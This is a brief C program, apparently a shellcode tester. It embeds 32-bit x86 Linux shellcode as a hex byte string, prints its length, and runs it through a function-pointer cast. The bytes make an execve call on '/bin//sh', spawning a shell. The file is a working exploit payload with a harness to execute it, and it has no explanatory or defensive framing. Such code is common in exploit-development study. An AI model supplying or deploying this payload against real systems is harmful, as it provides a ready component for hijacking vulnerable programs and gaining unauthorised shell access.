#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xdb\xf7\xe3\x04\x0b\x53\x53\x59\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{
printf("Shellcode Length:  %d", strlen(code));
int(*ret)() = (int(*)())code;
ret();
}
